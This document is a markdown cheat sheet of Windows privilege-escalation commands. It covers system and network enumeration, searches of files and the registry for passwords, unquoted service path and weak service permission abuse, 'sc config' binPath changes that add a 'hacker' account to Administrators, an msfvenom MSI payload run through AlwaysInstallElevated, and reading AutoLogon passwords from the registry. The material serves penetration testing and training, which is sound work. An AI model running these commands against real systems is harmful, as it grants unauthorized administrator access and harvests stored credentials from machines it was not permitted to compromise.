---
title: "Windows Privilege Escalation"
description: "Windows local enumeration commands, misconfigurations, and escalation methods"
---

A cheat sheet of common cmd.exe and PowerShell commands used for enumerating and escalating privileges on Windows systems.

### System Enumeration

| **Command** | **Description** |
| :--- | :--- |
| `systeminfo` | Get OS version, architecture, and patch levels (Hotfixes) |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | List installed KB updates (Hotfixes) |
| `hostname` | View the machine hostname |
| `echo %USERNAME%` | Check current user username |
| `whoami /all` | View user privileges, group memberships, and SID |
| `net users` | View list of users on the machine |
| `net user <username>` | View details of a specific user |
| `net localgroup` | View local groups on the system |
| `net localgroup Administrators` | View members of the Administrators group |

### Network & Process Enumeration

| **Command** | **Description** |
| :--- | :--- |
| `ipconfig /all` | List network interfaces and settings |
| `route print` | Print local routing tables |
| `netstat -ano` | List all open ports, active connections, and corresponding PIDs |
| `tasklist /v` | List all active processes and who owns them |
| `driverquery` | List installed system drivers |

### Finding Weak File & Registry Permissions

| **Command** | **Description** |
| :--- | :--- |
| `icacls "C:\Path\To\File"` | Check folder/file permissions (Check for Full/Modify access) |
| `dir /s /b C:\*pass*` | Search for password files on drive C |
| `findstr /si password *.xml *.ini *.txt` | Search for "password" in configuration files |
| `reg query HKLM /f password /t REG_SZ /s` | Search registry for entries matching "password" |

### Windows Services Exploitation

#### 1. Unquoted Service Paths
Identify service paths containing spaces and lacking quotation marks.

```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
*If a path is `C:\Program Files\My App\Service.exe` and we can write to `C:\Program Files\My App\`, we can place a malicious executable named `Service.exe` or `My.exe` (in `C:\Program Files\`) to intercept execution.*

#### 2. Weak Service Permissions (Modifying Service Binaries)
Find services where users have permission to modify files in the application directory or modify the service path.

```powershell
# Using PowerShell to check permissions of all service executables
Get-WmiObject win32_service | Select-Object Name, PathName | ForEach-Object {
    $path = $_.PathName -replace '"', ''
    if ($path -and (Test-Path $path)) {
        $acl = Get-Acl $path
        foreach ($access in $acl.Access) {
            if ($access.IdentityReference -like "*Everyone*" -or $access.IdentityReference -like "*Users*") {
                if ($access.FileSystemRights -like "*Write*" -or $access.FileSystemRights -like "*FullControl*") {
                    [PSCustomObject]@{ ServiceName = $_.Name; Path = $path; User = $access.IdentityReference; Rights = $access.FileSystemRights }
                }
            }
        }
    }
}
```

If we have write rights, we can replace the service binary with our payload, then restart the service:
```cmd
net stop <ServiceName>
net start <ServiceName>
```

#### 3. Weak Service Configuration (Modifying binPath)
If we can modify service configuration (such as with the `sc` command):

```cmd
# Check if current user has permission to configure a service (using Accesschk from Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *

# Change service binary path to execute our command (e.g. adding a new user)
sc config <ServiceName> binpath= "net user hacker Password123! /add"
sc config <ServiceName> binpath= "net localgroup Administrators hacker /add"

# Restart the service to execute
sc stop <ServiceName>
sc start <ServiceName>
```

### Other Privilege Escalation Techniques

#### AlwaysInstallElevated
Check if Windows allows regular users to install MSI files with System privileges.

```cmd
# Check HKLM
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check HKCU
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
*If both registry values return `0x1`, generate a malicious MSI file (e.g. via `msfvenom`) and execute:*

```cmd
msiexec /quiet /qn /i payload.msi
```

#### Harvesting Credentials from AutoLogon
Retrieve credentials stored in the registry for auto-login configurations.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```
